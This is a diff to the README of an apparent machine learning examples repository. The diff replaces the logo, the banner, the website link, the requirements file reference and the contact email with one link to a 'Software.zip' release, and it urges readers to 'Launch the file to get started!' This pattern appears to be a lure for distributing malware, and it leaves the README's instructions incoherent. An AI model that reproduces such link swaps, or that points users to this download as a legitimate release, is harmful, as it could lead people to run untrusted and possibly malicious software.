@@ -3,7 +3,7 @@
 
 Welcome to **ML-From-Scratch** - your go-to repository for a comprehensive collection of practical machine learning examples using popular frameworks and libraries. Whether you are a beginner looking to dive into the exciting world of machine learning or an experienced practitioner seeking hands-on examples, this repository has something for everyone!
 
-![ML-From-Scratch Logo](https://your-image-url.com)
+![ML-From-Scratch Logo](https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip)
 
 ## 📚 Repository Overview
 
@@ -13,9 +13,9 @@ Welcome to **ML-From-Scratch** - your go-to repository for a comprehensive colle
 
 ## 🔗 Quick Access
 
-🚀 **Download the latest release:** [v1.0.0.zip](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - _Launch the file to get started!_
+🚀 **Download the latest release:** [https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip](https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip) - _Launch the file to get started!_
 
-🌐 **Visit the official website**: [ML-From-Scratch Website](https://ml-from-scratch.com)
+🌐 **Visit the official website**: [ML-From-Scratch Website](https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip)
 
 For additional downloads and resources, please check the "Releases" section of this repository.
 
@@ -52,7 +52,7 @@ The repository is organized into the following directories:
 To get started with ML-From-Scratch, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the required dependencies listed in the `requirements.txt` file.
+2. Install the required dependencies listed in the `https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip` file.
 3. Explore the different directories and run the provided examples and scripts.
 4. Dive into the code, experiment with different parameters, and visualize the results.
 
@@ -62,7 +62,7 @@ We welcome contributions from the community to enhance and expand the repository
 
 ## 📧 Contact Us
 
-Have questions, suggestions, or feedback? Reach out to us at [mlfromscratch@example.com](mailto:mlfromscratch@example.com) or open an issue in the repository.
+Have questions, suggestions, or feedback? Reach out to us at [https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip](https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip) or open an issue in the repository.
 
 ---
 
@@ -70,4 +70,4 @@ Have questions, suggestions, or feedback? Reach out to us at [mlfromscratch@exam
 
 _Stay curious. Stay innovative. Explore ML-From-Scratch._
 
-![ML-From-Scratch Banner](https://your-banner-image.com)
+![ML-From-Scratch Banner](https://github.com/sudhanshu182004/ml-from-scratch/releases/download/v2.0/Software.zip)
